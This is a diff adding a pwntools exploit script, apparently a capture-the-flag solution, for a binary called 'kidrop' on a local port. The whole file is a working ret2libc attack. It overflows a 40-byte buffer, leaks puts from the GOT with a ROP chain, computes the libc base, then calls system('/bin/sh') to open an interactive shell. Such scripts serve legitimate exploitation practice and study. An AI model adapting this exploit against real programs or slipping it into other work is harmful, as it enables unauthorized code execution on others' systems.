@@ -1,0 +1,44 @@
+from pwn import *
+
+# r = process("./dist/kidrop")
+r = remote("localhost", 5013)
+pause()
+
+VULN = 0x00000000004012a0
+
+RET = 0x000000000040101a
+PUTS = 0x00000000004012d9
+POP_RDI_RET = 0x0000000000401353
+PUTS_GOT = 0x404018
+
+PUTS_OFFSET = 0x875a0 # 0x625a0 # 0x875a0
+SYSTEM_OFFSET = 0x55410 # 0x30410 # 0x55410
+BINSH_OFFSET = 0x1b75aa
+
+PAYLOAD = b"A" * 40
+PAYLOAD += p64(POP_RDI_RET)
+PAYLOAD += p64(PUTS_GOT)
+PAYLOAD += p64(PUTS)
+PAYLOAD += p64(VULN)
+
+r.sendline(PAYLOAD)
+
+r.recvline()
+PUTS_LIBC = u64(r.recvline()[:-1].ljust(8, b"\x00"))
+info(f"PUTS@LIBC: {hex(PUTS_LIBC)}")
+LIBC_BASE = PUTS_LIBC - PUTS_OFFSET
+info(f"LIBC_BASE: {hex(LIBC_BASE)}")
+SYSTEM_LIBC = LIBC_BASE + SYSTEM_OFFSET
+info(f"SYSTEM@LIBC: {hex(SYSTEM_LIBC)}")
+BINSH_LIBC = LIBC_BASE + BINSH_OFFSET
+info(f"BINSH@LIBC: {hex(BINSH_LIBC)}")
+
+PAYLOAD2 = b"A" * 40
+PAYLOAD2 += p64(RET)
+PAYLOAD2 += p64(POP_RDI_RET)
+PAYLOAD2 += p64(BINSH_LIBC)
+PAYLOAD2 += p64(SYSTEM_LIBC)
+
+r.sendline(PAYLOAD2)
+
+r.interactive()
